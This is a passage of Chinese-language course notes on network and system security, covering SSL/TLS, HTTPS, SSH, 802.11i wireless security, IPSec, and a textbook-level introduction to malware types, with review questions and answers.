class="headerlink" title="Web安全威胁"></a>Web安全威胁</h4><p><img src="/images/websec.png"></p><h4 id="Web流量安全方法"><a href="#Web流量安全方法" class="headerlink" title="Web流量安全方法"></a>Web流量安全方法</h4><p>1.使用IPSec。它对终端用户和应用是透明的，具有过滤功能，使得只用IPSec处理所选流量。</p><p>2.仅在TCP上实现安全，最典型的例子就是安全套接字层SSL和被称为第二代互联网安全标准TLS</p><p>3.特定安全服务在特定的应用中得以体现，比如Kerberos</p><h3 id="安全套接字层和传输层安全"><a href="#安全套接字层和传输层安全" class="headerlink" title="安全套接字层和传输层安全"></a>安全套接字层和传输层安全</h3><h4 id="SSL体系结构"><a href="#SSL体系结构" class="headerlink" title="SSL体系结构"></a>SSL体系结构</h4><p>SSL（安全套接字层）使用TCP提供一种可靠的端对端的安全服务。SSL不是单个协议，它由两层协议组成，如图6.2所示。SSL记录协议对各种更高层协议提供基本的安全服务。</p><p><img src="/images/ssl.png"></p><p>SSL协议中最重要的两个概念是SSL会话和SSL连接，按照规范文件，他们的定义如下：</p><ul><li>连接：连接是一种能够提供合适服务类型的传输。对SSL来说，这种连接是点对点的关系而且都是短暂的。每一条连接都与一个会话相关联。</li><li>会话：SSL会话是客户与服务器之间的一种关联。会话是通过握手协议来创建的。所有会话都定义了密码安全参数集合，这些参数可以在多个安全连接之间共享。会话通常来减少每次连接建立安全参数的昂贵协商花费。</li></ul><h4 id="SSL记录协议"><a href="#SSL记录协议" class="headerlink" title="SSL记录协议"></a>SSL记录协议</h4><p>SSL记录协议为SSL连接提供如下两种服务。</p><ul><li>机密性：握手协议定义一个可用于加密SSL载荷的传统加密共享密钥</li><li>消息完整性：握手协议还定义一个用于产生消息认证码（MAC）的共享密钥</li></ul><p>SSL记录协议的运行流程：</p><p><img src="/images/sslrec.png"></p><h4 id="修改密码规格协议"><a href="#修改密码规格协议" class="headerlink" title="修改密码规格协议"></a>修改密码规格协议</h4><p>修改密码规格协议是应用SSL记录协议的3个SSL规格协议之一,也是最简单的一个协议。本协议只包含一条消息(见图6.5 (a))， 由一个值为1的字节组成。这条消息的唯功能是使得挂起状态改变为当前状态，用于更新此连接使用的密码套件。</p><p><img src="/images/sslrecpayload.png"></p><h4 id="警报协议"><a href="#警报协议" class="headerlink" title="警报协议"></a>警报协议</h4><p>警报协议用于将与SSL相关的警报传达给对等实体。与使用SSL的其他应用一样，警报消息也要按照当前状态的规格进行压缩和加密操作。</p><p>这一协议过程中的每一条消息都由两个字节组成。其中第一个字 节可以取值为警告(1)或致命(2)以表示消息的严重程度。如果严重程度为致命，SSL 将立即结束当前连接。虽然该会话中的其他连接还可以继续进行，但是本次会话不允许建立新的连接。第二个字节包括一种用于指明具体警告的编码。</p><h4 id="握手协议"><a href="#握手协议" class="headerlink" title="握手协议"></a>握手协议</h4><p>SSL最复杂的部分是握手协议。这一协议允许客户端和服务器相互认证，并协商加密和mac算法，以及用于数据保护使用的密钥通过SSL记录传送。握手协议在任何应用数据被传输之前使用。</p><p><img src="/images/handshake.png"></p><p>四个阶段：</p><ol><li>客户端发起建立连接请求</li><li>服务器认证和密钥交换</li><li>客户端认证和密钥交换</li><li>完成</li></ol><h4 id="密码计算"><a href="#密码计算" class="headerlink" title="密码计算"></a>密码计算</h4><p>主要关注以下两个问题：</p><ul><li>通过密钥交换创建一个共享主密钥</li><li>从共享主密钥中产生密码参数</li></ul><p>主密钥的创建：共享主密钥是通过安全密钥交换方式为本次会话创建的一一个一次性48字节(384比特)的值。创建过程分两步完成。第一步，交换预备主密钥。第二步，双方计算主密钥。</p><p>密码参数产生：密码规格要求客户端写MAC值的密钥、服务器写MAC值密钥、客户端写密钥、服务器写密钥、客户端写初始向量IV、服务器写初始向量IV，这些都是按顺序由主密钥产生的。其方法是主密钥利用散列函数来产生安全字节序列，字节序列足够长以便生成所有需要的参数。</p><h3 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h3><p>HTTPS是指用HTTP和SSL的结合来实现网络浏览器和服务器之间的安全通信。</p><p>标准http使用80端口，https使用443端口</p><h4 id="连接的初始化"><a href="#连接的初始化" class="headerlink" title="连接的初始化"></a>连接的初始化</h4><p>​    用户在合适的端口向服务器发起一个连接,然后发送TLS ClientHello,开始TLS信号交换。当TLS信号交换完毕后，用户将发起第一次HTTP请求。所有HTTP数据都要以TLS应用数据形式发送。然后是包括保持连接在内的传统HTTP操作。</p><h4 id="连接关闭"><a href="#连接关闭" class="headerlink" title="连接关闭"></a>连接关闭</h4><p>一个HTTP用户或者服务器可以通过在HTTP记录中加入“connection: close”的字样来指示一个连接的关闭。这意味着该连接将会在该条记录传输之后关闭。</p><p>关闭一个HTTPS连接要求关闭TLS与其对应的远程终端之间的连接，这要求关闭潜在的TCP连接。在TLS层，关闭一个连接的适当做法是两端都是用TLS警报通信协议发出一个“close notify” 警告。TLS实例必须在关闭连接之前发起一个关闭警报的交换。在发出一个关闭警告后，一个TLS实例会关闭这个连接，而不会等待它的另一端发来关闭警告，这造成了一个“不完整的关闭”。如果一个用户这么做了，可能是为了之后再次使用该会话。这只有在这个应用层知道(通常是通过检查HTTP消息边界)它接收了所有它关心的数据之后才可以完成。</p><h3 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h3><p>SSH由三个通信协议组织而成，通常运行在TCP之上：</p><ul><li><strong>传输层协议</strong>:提供服务器身份验证、数据保密性、带前向安全的数据完整性(比如，如果一个密钥在-一个会话期中泄密，这个消息不会影响之前会话期的安全)。传输层会有选择地提供压缩。</li><li><strong>用户身份验证协议</strong>:验证服务器的用户。</li><li><strong>连接协议</strong>:在一个单一、基础的SSH连接上复用多个逻辑的通信信道。</li></ul><h4 id="传输层协议"><a href="#传输层协议" class="headerlink" title="传输层协议"></a>传输层协议</h4><p><strong>主机密钥：</strong>服务器认证发生在传输层，基于拥有-对公共&#x2F;私有密钥的服务器。一个服务器会有多个主机密钥运用多重不同的非对称加密算法。多个主机会公用一个主机密钥。在任何情况下，服务器的主机密钥在密钥交换时被用来确认主机的身份。为了使这成为可能，用户必须掌握有关服务器的公共主机密钥的先验知识。</p><h4 id="分组交换"><a href="#分组交换" class="headerlink" title="分组交换"></a>分组交换</h4><p><img src="/images/sshfenzu.png"></p><p><img src="/images/sshchuanshu.png"></p><h4 id="用户身份认证协议"><a href="#用户身份认证协议" class="headerlink" title="用户身份认证协议"></a>用户身份认证协议</h4><p>用户身份认证协议提供用户向服务器证明自己身份的方法。</p><p>身份认证方式：</p><ul><li>公开密钥</li><li>口令密码</li><li>基于主机</li></ul><h4 id="连接协议"><a href="#连接协议" class="headerlink" title="连接协议"></a>连接协议</h4><p>SSH连接协议在SSH传输层协议之上运行，并假设使用了安全的认证连接。安全的认证连接是指连接协议用一个通道虚拟出多条逻辑信道。</p><p><strong>信道机制：</strong>所有使用SSH的通信类型，例如一个终端会话，都由不同的信道支持。双方中的任意一方都可能开启一个信道。对于每个信道，每一方都有一个独一无二的信道序列号，两方的序列号不用一致。 信道是通过一个窗口机制进行流量控制的。只有当接收的信息指明有窗口空间时，才可能有数据发送到信道。</p><p>信道的生命周期有三个阶段：开启信道、数据传送和关闭信道。</p><p>信道类型：</p><ul><li>会话</li><li>X11</li><li>前向tcpip</li><li>直接tcpip</li></ul><p><strong>端口转发：</strong>SSH最有用的特征之一就是端口转发。本质上来说，端口转发能够将任何不安全的TCP连接转换成安全的SSH连接。这也称为SSH隧道技术。我们需要知道在这种环境下端口的含义。一个端口是一个TCP用户的标识符。所以，任何运行在TCP上的应用程序都具有一个端口号。基于该端口号，TCP链路向合适的应用程序发送数据。一个应用程序可能使用多个端口号。比如，简单邮件传输协议(SMTP)，服务器端通常会在端口25监听，所以一个SMTP请求需要使用TCP并使数据到达目的端口25。TCP辨别这是SMTP服务器地址，同时发送数据到SMTP服务器应用程序。</p><p><img src="/images/sshsuidao.png"></p><h3 id="问题思考-1"><a href="#问题思考-1" class="headerlink" title="问题思考"></a>问题思考</h3><p>1.SSL有哪些协议组成？</p><p>SSL更改密码规范协议，SSL警报协议，SSL记录协议</p><p>2.SSL会话和连接的区别？</p><p>对于SSL来说，连接是临时的，每个连接都与一个会话关联。会话是客户机和服务器之间的关联，会话是由握手协议创建。会话会定义一组加密安全参数，这些参数可以在多个连接之间共享，会话的作用是为了避免为每个连接进行昂贵的新安全参数协商。</p><h2 id="无线网络安全"><a href="#无线网络安全" class="headerlink" title="无线网络安全"></a>无线网络安全</h2><h3 id="无线安全"><a href="#无线安全" class="headerlink" title="无线安全"></a>无线安全</h3><p>威胁无线网络安全的关键因素列举如下：</p><ul><li>信道：与有线网络相比，更易受监听和干扰的影响</li><li>移动性：无线设备相较于有线设备更具有移动性和便捷性，造成很多安全隐患</li><li>资源：一些无线设备，具有复杂的操作系统，但是只有有限的存储空间和资源供我们抵抗诸如拒绝服务和恶意软件的攻击</li><li>易接近性：一些无线设备经常会被单独放在遥远的或者地方的环境中，这大大增加了它们收到物理攻击的可能性</li></ul><h4 id="无线网络安全威胁"><a href="#无线网络安全威胁" class="headerlink" title="无线网络安全威胁"></a>无线网络安全威胁</h4><p>无线网络的安全威胁：</p><ul><li>偶然连接：相邻的公司无线局域网或连接到有线局域网的无线接入点之间，可能会产生互相重叠的传送区间。当一个用户想要连接到一个局域网之中时，会无意中被锁定在相邻的无线接入点。尽管安全缺口时偶然出现的，但是它足以将这个局域网的资源暴露给一个偶然闯入的用户。</li><li>恶意连接：在这种情况下，一个无线设备被配置伪装成了一个合法的接入点，使得攻击者可以从合法用户那里盗取密码，然后再使用盗取的密码侵入合法接入点。</li><li>Ad hoc网络：Ad hoc网络:这种网络是不包含接入点的、无线计算机之间的、对等方式的网络。由于没有中心点的控制，这种网络可能存在安全隐患。</li><li>非传统型网络：非传统型网络和链接，如个人网络蓝牙设备、条形码识别器和手持型PDA，面临着被监听和欺诈的安全隐患。</li><li>身份盗窃（MAC欺诈）：身份盗窃(MAC欺诈):这种威胁发生在攻击者可以通过网络权限监听网络信息流<br>通量，并认证计算机的MAC地址的时候。</li><li>中间人攻击</li><li>拒绝服务</li><li>网络注入：网络注入攻击的目标是暴露于未过滤的网络信息流之中的无线接入点，例如路由选择协议信息或网络管理信息。实现这种攻击的一个例子是，使用伪造的重配置命令，来影响路由器和交换机，从而降低网络性能。</li></ul><h4 id="无线安全措施"><a href="#无线安全措施" class="headerlink" title="无线安全措施"></a>无线安全措施</h4><p><strong>安全无线传输：</strong></p><ul><li>信息隐藏技术：组织很多手段可以使得攻击者定位无线接入点变得更难，包括取消广播服务，设置初始化校验器SSID，给SSID分配加密的名称，保证提供必要覆盖率的情况下，将信号强度降到最低水平，使用定向天线</li><li>加密</li></ul><p><strong>安全的无线接入点：</strong>802.1X</p><p><strong>安全的无线网络：</strong></p><ul><li>使用加密手段</li><li>使用防火墙</li><li>关闭标识符广播</li><li>改变默认标识符</li><li>改变路由器的预设密码</li><li>只允许专用的计算机访问无线网络</li></ul><h3 id="IEEE-802-11无线局域网概述"><a href="#IEEE-802-11无线局域网概述" class="headerlink" title="IEEE 802.11无线局域网概述"></a>IEEE 802.11无线局域网概述</h3><p>关键术语：</p><p><img src="/images/80211shuyu.png"></p><h4 id="IEEE802协议架构"><a href="#IEEE802协议架构" class="headerlink" title="IEEE802协议架构"></a>IEEE802协议架构</h4><p><strong>物理层：</strong>最底层就是物理层，该层的功能包括信号的加密和解密，比特流的传输和接收，对于802.11，物理层还定义了频率范围和天线特性。</p><p><strong>媒体访问控制MAC：</strong>所有局域网都包含有共享网络传输容量的设施，就有需要一些方法来控制传输介质的接口，以便使这些容量能够得到有序高效的应用。功能主要有：</p><ul><li>传输时将数据组装成帧</li><li>接收时，将帧拆开，并进行地址确认和错误检测</li><li>控制局域网传输介质的接口</li></ul><p><strong>逻辑链路控制LLC：</strong>在大多数的数据链路控制协议中，数据链路协议不仅利用CRC来进行错误检测，而且利用重传的损坏的数据帧进行恢复。MAC负责检测错误并丢弃包含错误的帧，LLC层可选择地追踪成功接收的帧或者重传不成功的帧。</p><h4 id="IEEE-802-11网络组成与架构模型"><a href="#IEEE-802-11网络组成与架构模型" class="headerlink" title="IEEE 802.11网络组成与架构模型"></a>IEEE 802.11网络组成与架构模型</h4><p>一个无线局域网最小的组成块是<strong>基本服务单元(BSS)<strong>， 包含执行相同</strong>MAC</strong>协议和竞争同一无线介质接口的多个无线站点。一个BSS可能是独立的，也可能是通过**访问接入点(AP)<strong>链接到</strong>分布式系统(DS)**。 访问接入点具有桥梁和中继作用。在一个基本服务单元中，同一基本服务单元中的用户站点不直接进行相互通信，来自初始站点的数据帧先发送到访问接入点，然后从访问接入点发送到目的站点。而从一个基本服务单元的站点到一个遥远站点发送帧，先由该站点到访问接入点，然后通过访问接入点中继到分配系统，最终到达目的站点。基本服务单元可以看成一个细<br>胞，而分配系统可以是交换机、有线网络，也可以是无线网络。</p><p>若一个基本服务单元BSS中的站点都是移动站点，并且相互之间能够通信而不用通过访问接入点，则该基本服务单元BSS称为**独立基本服务单元(IBSS)<strong>。 独立基本服务单元是一个典型的点对点模式的网络。在独立基本服务单中，所有站点直接通信，没有访问接入点涉入其中。</strong>一个扩展服务单元(ESS)**包含两个或多个通过分配系统相连的基本服务单元。而对于逻辑链路控制层来说,扩展服务单元对该逻辑链路控制层相当于一个单一的逻辑局域网。</p><h3 id="IEEE-802-11i-无线局域网安全"><a href="#IEEE-802-11i-无线局域网安全" class="headerlink" title="IEEE 802.11i 无线局域网安全"></a>IEEE 802.11i 无线局域网安全</h3><h4 id="IEEE-802-11i服务"><a href="#IEEE-802-11i服务" class="headerlink" title="IEEE 802.11i服务"></a>IEEE 802.11i服务</h4><p>802.11i的RSN安全规范定义了以下几种服务。</p><ul><li>认证:一种定义了用户和认证服务器之间交换的协议，能够相互认证，并产生暂时密钥用于通过无线连接的用户和访问接入点之间。</li><li>访问控制: 该功能迫使认证功能的使用，合理安排信息，帮助密钥交换，能够在一系列的认证协议下工作。</li><li>信号完整性加密: MAC层数据(例如，LLC协议数据单元)与信号完整性字段一起加密，以确保数据没有被篡改。</li></ul><h4 id="IEEE-802-11i操作阶段"><a href="#IEEE-802-11i操作阶段" class="headerlink" title="IEEE 802.11i操作阶段"></a>IEEE 802.11i操作阶段</h4><p>5个操作阶段：</p><ul><li>发现:访问接入点使用信标和探测响应信息来发布其IEEE 802.11i安全策略。站点则通过这些来确认希望进行通信的无线局域网访问接入点的身份。站点连接访问接入点，当信标和探测响应提供选择时，选择加密套件和认证机制。</li><li>认证:在本阶段，站点和认证服务器相互证明各自的身份。访问接入点阻止站点和认证服务器之间直到认证成功之前尚未被认证的传输。访问接入点不参与认证，参与认证的是转发站点和认证服务器之间的数据传输。</li><li>密钥的产生及配送: 访问接入点和站点执行几种操作之后产生加密密钥，并配送到访问接入点和站点。数据帧只在访问接入点和站点之间进行交换。</li><li>保密数据传输:数据帧在站点和终端站点之间通过访问接入点进行交换。安全数据传输只发生在站点和访问接入点之间，而不能确保端到端的安全。</li><li>连接终止:访问接入点和站点交换数据帧。在本阶段，安全连接被解除，连接恢复到初始状态。</li></ul><p><img src="/images/ieee80211i.png"></p><h4 id="发现阶段"><a href="#发现阶段" class="headerlink" title="发现阶段"></a>发现阶段</h4><p>该阶段功能是站点和网络接入点相互确认身份，协商一系列安全策略，并建立连接一边将来进行通信。</p><p>MPDU交换：包含三个交换：</p><ul><li>网络和安全通道的发现</li><li>开放系统认证</li><li>连接</li></ul><h3 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h3><p>1.什么是802.11 WLAN的基本构建块？</p><p>基本服务集BSS。</p><p>2.什么是扩展服务集？</p><p>由一个配电系统互连的两个或者多个基本服务集。</p><h2 id="IP安全"><a href="#IP安全" class="headerlink" title="IP安全"></a>IP安全</h2><h3 id="IP安全概述"><a href="#IP安全概述" class="headerlink" title="IP安全概述"></a>IP安全概述</h3><h4 id="IPSec的应用"><a href="#IPSec的应用" class="headerlink" title="IPSec的应用"></a>IPSec的应用</h4><p>IPSec提供了在LAN、专用和公用WAN以及互联网中安全通信的性能，它的用途包括如下方面：</p><ul><li>通过互联网安全分支机构接入</li><li>通过互联网进行安全远程访问</li><li>与合作者建立企业间联网和企业内联网接入</li><li>加强电子商务安全性</li></ul><h4 id="IPSec的好处"><a href="#IPSec的好处" class="headerlink" title="IPSec的好处"></a>IPSec的好处</h4><p><img src="/images/ipsec1.png"></p><ul><li>当路由器或者防火墙中使用IPSec时，它对通过其边界的所有通信流提供了强安全性。</li><li>防火墙内IPSec能在所有的外部流量必须使用IP时阻止旁路，因为防火墙是从互联网进入组织内部的唯一通道。</li><li>IPSec位于传输层（TCP、UDP）之下，所以对所有的应用都是透明的</li><li>IPSec可以对终端用户透明</li><li>若有必要，IPSec可以对个人用户提供安全性</li></ul><h4 id="路由应用"><a href="#路由应用" class="headerlink" title="路由应用"></a>路由应用</h4><p>除了支持终端用户和保护上述系统及网络外，IPSec在互联网结构中扮演者非常重要的角色，IPSec可确保：</p><ul><li>路由器广播（新的路由器公告它的存在）来自授权的路由器</li><li>邻居广播（路由器试图建立或者维护与其他路由区域中路由器的邻居关系）来自授权服务器</li><li>重定向报文，它来自被发送给初始包的路由器</li><li>路由更新未被伪造</li></ul><h4 id="IPSec服务"><a href="#IPSec服务" class="headerlink" title="IPSec服务"></a>IPSec服务</h4><ul><li>访问控制</li><li>无连接完整性</li><li>数据源认证</li><li>拒绝重放包</li><li>保密性</li><li>受限制的流量保密性</li></ul><h4 id="传输模式和隧道模式"><a href="#传输模式和隧道模式" class="headerlink" title="传输模式和隧道模式"></a>传输模式和隧道模式</h4><p><strong>传输模式：</strong>传输模式主要为上层协议提供保护。也就是说，传输模式保护增强了对IP包载荷的保护，如对TCP段、UDP段或ICMP包的保护(这些均直接运行在主机协议栈的IP之上)。一般地，传输模式用于在两个主机(如客户端和服务器、两个工作站)之间进行端对端的通信。当主机在IPv4上运行AH或ESP时，其载荷通常是接在IP报头后面的数据。对于IPv6而言，其载荷通常是接在IP报头后面的数据和任何存在的IPv6扩展报头，其中可能会把目的选项报头除外，因为它可能在保护状态下。<br>传输模式下的ESP加密和认证(认证可选) IP载荷，但不包括IP报头。传输模式的AH认证IP载荷和IP报头的选中部分。</p><p><strong>隧道模式：</strong> 隧道模式对整个IP 包提供保护。为了达到这个目的，在把AH或者ESP域添加到IP包中后，整个包加上安全域被作为带有新外部IP报头的新“外部”IP包的载荷。整个原始的或者说是内部的包在“隧道”上从IP网络中的一一个节点传输到另一个节点，沿途的路由器不能检查内部的IP报头。因为原始的包被封装，新的更大的包有完全不同的源地址和目的地址，因此增加了安全性。隧道模式被使用在当SA的一端或者两端为安全网关时，比如使用IPSec的防火墙和路由器。在传输模式下，即使不使用IPSec,位于防火墙后的主机间也可能进行安全通信。这种主机产生的未受保护的包借助隧道模式SA穿越外部网络，隧道模式SA是由防火墙中的IPSec 软件或本地网络边缘的安全路由器建立的。</p><p><img src="/images/ahesp.png"></p><h3 id="IP安全策略"><a href="#IP安全策略" class="headerlink" title="IP安全策略"></a>IP安全策略</h3><h4 id="安全关联"><a href="#安全关联" class="headerlink" title="安全关联"></a>安全关联</h4><p>IPSec操作的基础是应用于每个由源地址到目的地址传输中IP包安全策略的概念。IPSec安全策略本质上由两个交互的数据库，<strong>安全关联数据库SAD</strong>（定义与每个SA相关的安全参数）和<strong>安全策略数据库SPD</strong>（IP流量与特定SA相关联的方法）确定，对应关系如下：</p><p><img src="/images/ipsec2.png"></p><p>在IP认证和加密机制中都会出现的一个重要的概念就是安全关联SA。安全关联是发送端和接收端之间用于对它们之间传递的数据流提供安全服务的一个单向逻辑连接。一个安全关联由如下三个参数唯一确定：</p><ul><li>安全参数索引SPI</li><li>IP目的地址</li><li>安全协议标识</li></ul><h4 id="IP通信进程"><a href="#IP通信进程" class="headerlink" title="IP通信进程"></a>IP通信进程</h4><p>IPSec是在报文到报文的基础上进行的。当IPSec执行时，发往外部的包在传送前经过IPSec处理，而发往内部的包在接收之后并且在发送报文内容到更高层之前经过IPSec处理。</p><p><strong>出站报文：</strong></p><p>(1)  IPSec 查询SPD对该报文寻找匹配。<br>(2) 如果没有匹配，报文被丢弃并生成错误信息。<br>(3) 如果发现匹配，则进一步的处理由SPD中的第-一个匹配接口决定。如果对该报文的策略是丢弃，则该报文被丢弃。如果策略是通过，则没有进一步的IPSec 处理:报文传向网络以便发送。<br>(4) 如果策略是保护，则查询SAD来寻找匹配接口。如果没有发现接口，则引入IKE 生成具有合适密钥的SA，并在SA上产生接口。<br>(5) SA上的匹配接口决定报文的进一步处理。对报文加密或者认证，或者两者都被执行，并且既可以使用传输模式，也可以使用隧道模式。报文传向网络以便发送。</p><p><strong>入站报文：</strong></p><p>(1)通过检测IP协议域(IPv4)或者下一个头域(IPv6)， IPSec决定这是一个不安全的IP包，还是一个有ESP或者AH头&#x2F;尾的报文。<br>(2)如果报文不安全，IPSec 查询SPD为该报文寻找匹配。如果第一个匹配接口的策略是通过，则IP头经过处理后被剥离，而IP数据体传输到更高层(如TCP)。如果第一个匹配接口的策略是保护或者丢弃，或者没有匹配接口，则报文被丢弃。<br>(3)对于安全报文，IPSec查询SAD。如果没有匹配，报文被丢弃。否则，IPSec使用合理的ESP或者AH进程。然后IP头经过处理后被剥离，而IP数据体传输到更高层(如TCP)。</p><h3 id="封装安全载荷"><a href="#封装安全载荷" class="headerlink" title="封装安全载荷"></a>封装安全载荷</h3><h4 id="ESP格式"><a href="#ESP格式" class="headerlink" title="ESP格式"></a>ESP格式</h4><ul><li>安全参数索引</li><li>序列号</li><li>载荷数据</li><li>填充域</li><li>填充长度</li><li>邻接报头</li><li>完整性校验值</li></ul><p><img src="/images/esppacket.png"></p><h4 id="加密和认证算法"><a href="#加密和认证算法" class="headerlink" title="加密和认证算法"></a>加密和认证算法</h4><p>ESP服务加密载荷数据、填充域、填充长度和邻接报头域，如果用于加密载荷的算法需要使用密码同步数据，如初始向量IV，则这些数据可以在载荷数据域的开始处显式地传输。如果包括IV，它虽然会被看成密文的一部分，但是不会被加密。</p><p>ICV域是可选的，仅当选择了完整性服务且该服务由一个单独的完整性算法提供，或者由用于ICV的组合式算法提供时，该域才会出现。ICV的值是在加密完成后才会被计算。</p><h4 id="防止重放服务"><a href="#防止重放服务" class="headerlink" title="防止重放服务"></a>防止重放服务</h4><p>IP是一个无连接不可靠的服务，协议不能保证数据包按照顺序传输，也不能保证所有的包均被传输，因此规定了接收方应实现一个大小为W的窗口（默认值为64），处理过程如下：</p><p>(1)如果接收到的包在窗口中而且是新包，则验证消息认证码(MAC)。若验证通过，就标记窗口中相应的位置。<br>(2)如果接收到的包超过了窗口的右边界而且是新包，则验证MAC，若验证通过，就让窗口前进以使得这个序列号成为窗口的右边界，并标记窗口中的相应位置。<br>(3)如果接收到的包超过了窗口的左边界或者没有通过验证，就丢掉这个包，这是一个可审计事件。</p><h4 id="传输模式和隧道模式-1"><a href="#传输模式和隧道模式-1" class="headerlink" title="传输模式和隧道模式"></a>传输模式和隧道模式</h4><p>下图说明了IPSec ESP服务的两种方式：</p><p><img src="/images/chuanshuandsuidao.png"></p><p>传输模式ESP用于加密和认证（认证可选）IP携带的数据。</p><p><img src="/images/espcryptandauth.png"></p><p>隧道模式ESP用来加密整个IP包。</p><p>两种模式下的协议架构：</p><p><img src="/images/espchuanshu.png"></p><p><img src="/images/espsuidao.png"></p><h3 id="安全关联组合"><a href="#安全关联组合" class="headerlink" title="安全关联组合"></a>安全关联组合</h3><p>安全关联可以通过如下两种方式组合成安全关联束：</p><ul><li>传输邻接：在没有激活隧道的情况下，对一个IP包使用多个安全协议。这种组合AH和ESP的方法仅考虑了单层组合，更多层次的嵌套不会带来收益，因为所有的处理都是在一个IPSec实例执行的。</li><li>隧道迭代：指通过IP隧道应用多层安全协议。这种方法考虑了多层嵌套，因为每个隧道都能在路径上的不同IPSec点处起始或者终止。</li></ul><h4 id="认证加保密"><a href="#认证加保密" class="headerlink" title="认证加保密"></a>认证加保密</h4><p>加密和认证组合起来以实现主机之间传送同时需要保密和认证的IP包。</p><p><strong>带认证选项的ESP</strong></p><ul><li>传输模式ESP：被传送到主机的IP载荷使用了认证和加密，但是IP报头不受保护。</li><li>隧道模式ESP：认证作用于被发送到外部IP目的地址的整个IP包，并在目的地进行认证。整个内部IP包由专用机制保护，这是为了传送到内部IP目的地</li></ul><p>这两种情况下，认证作用于密文而不是明文。</p><p><strong>传输邻接</strong></p><p>在加密之后使用认证的另一种方法就是使用两个捆绑在一起的传输SA，内部是ESP SA 外部是AH SA，在这种情况下使用的ESP没有认证选项。由于内部SA是一个传输SA，所以加密仅作用于IP载荷。</p><p><strong>传输-隧道束</strong> </p><p>在加密之前使用认证有几个优点。1.加密可以保护认证数据。2.可能会希望在目的地存储带着报文的认证信息以便将来查阅。</p><h4 id="安全关联的基本组合"><a href="#安全关联的基本组合" class="headerlink" title="安全关联的基本组合"></a>安全关联的基本组合</h4><p>对于主机对主机的SA来说，既可以是传输模式，也可以是隧道模式，除此之外都是隧道模式</p><p><img src="/images/sazuhe.png"></p><h3 id="因特网密钥交换"><a href="#因特网密钥交换" class="headerlink" title="因特网密钥交换"></a>因特网密钥交换</h3><p>IPSec的密钥管理部分包括密钥的确定和分发。一个典型要求是两个应用之间的通信需要四个密钥：用于完整性和机密性的发送对和接收对。IPSec的体系结构文档要求支持如下两种类型的密钥管理。</p><ul><li>手动类型</li><li>自动类型</li></ul><p>默认的IPSec自动类型密钥管理协议是ISAKMP&#x2F;Oakley，它由以下几部分组成。</p><ul><li>Oakley密钥确定协议：基于DH算法的密钥交换协议</li><li>互联网安全关联和密钥管理协议ISAKMP：为互联网密钥管理提供了一个框架，并提供了特定的协议支持，包括格式和安全属性协商</li></ul><h3 id="思考题-1"><a href="#思考题-1" class="headerlink" title="思考题"></a>思考题</h3><p>1.举出使用IPSec的例子</p><p>公司之间通过互联网间隙安全虚拟专用网络。增强电子商务的安全性。安全远程访问等等</p><p>2.IPSec提供哪些服务？</p><p>访问控制、无连接完整性、数据源认证、拒绝重放攻击包、机密性、有限流量的机密性</p><p>3.哪些参数标识了SA？哪些参数表现了一个特定SA的本质？</p><p>安全关联由三个参数唯一标识：安全参数索引、IP目标地址、安全协议标识符</p><p>4.传输模式和隧道模式有何区别？</p><p>传输模式主要为上层协议提供保护，也就是说传输模式保护扩展到IP的有效负载。隧道模式为整个IP数据包进行保护。</p><p>5.ESP为社么包括一个填充域？</p><p>如果加密算法要求明文是某些字节数的倍数，则填充字段用于将明文扩展到所需长度。ESP格式要求pad-length和next-header字段在32位字内右对齐，填充字段用于确保此对齐。可以添加额外填充，通过隐藏有效负载的实际长度来提供部分流量机密。</p><p>6.捆绑SA的基本方法是什么？</p><p>传输相邻和迭代隧道（多个隧道组合）</p><p>7.Oakley密钥确定协议和ISAKMP在IPSec中起到什么作用？</p><p>密钥交换等安全属性的协商</p><h1 id="系统安全"><a href="#系统安全" class="headerlink" title="系统安全"></a>系统安全</h1><ul><li>恶意软件是指为了恶意的目的而蓄意植入系统的软件</li><li>病毒是指通过修改其他程序而达到“感染”目的的软件，这种更改包括复制一个能够继续感染其他程序的病毒程序。</li><li>蠕虫是指通过复制自身，并将副本通过网络传到其他计算机上的程序。当传到其他计算机上，它又开始重复做同样的事情，除了不断繁殖传播之外，蠕虫还经常含有其他有害的功能。</li><li>拒绝服务攻击是指阻止合法用户正常地使用服务。</li><li>分布式拒绝服务攻击是指从多个源端发起的拒绝服务攻击。</li></ul><h2 id="恶意软件"><a href="#恶意软件" class="headerlink" title="恶意软件"></a>恶意软件</h2><h3 id="恶意软件类型"><a href="#恶意软件类型" class="headerlink" title="恶意软件类型"></a>恶意软件类型</h3><h4 id="恶意软件分类"><a href="#恶意软件分类" class="headerlink" title="恶意软件分类"></a>恶意软件分类</h4><p><img src="/images/eyiruanjian.png"></p><h3 id="传播-感染内容-病毒"><a href="#传播-感染内容-病毒" class="headerlink" title="传播-感染内容-病毒"></a>传播-感染内容-病毒</h3><h4 id="病毒的本质"><a href="#病毒的本质" class="headerlink" title="病毒的本质"></a>病毒的本质</h4><p>计算机病毒是能够通过修改而达到感染其他程序的一段软件，或者说实际上任何形式的可执行内容都可被感染。这种修改操作包括在原始代码中注入能够复制病毒代码的例程，而这些例程又能够继续感染其他内容。</p><h4 id="病毒的四个阶段"><a href="#病毒的四个阶段" class="headerlink" title="病毒的四个阶段"></a>病毒的四个阶段</h4><ul><li>潜伏阶段，处于休眠，直至被触发</li><li>传染阶段，复制自身，传染其他</li><li>触发阶段，被特定事件所激活</li><li>发作阶段，条件成熟，发作破坏</li></ul><h4 id="病毒的结构"><a href="#病毒的结构" class="headerlink" title="病毒的结构"></a>病毒的结构</h4><ul><li>病毒可以被放在可执行文件首部、尾部或以其他方式嵌入宿主程序，首先被执行的应当是病毒</li><li>简单的病毒</li><li>压缩的病毒</li></ul><h4 id="病毒的压缩过程"><a href="#病毒的压缩过程" class="headerlink" title="病毒的压缩过程"></a>病毒的压缩过程</h4><p>感染后的程序比感染之前的程序长，为防止被检测到，对可执行文件进行压缩，使得无论该程序是否被感染，它的长度都是相同的。</p><h4 id="病毒分类"><a href="#病毒分类" class="headerlink" 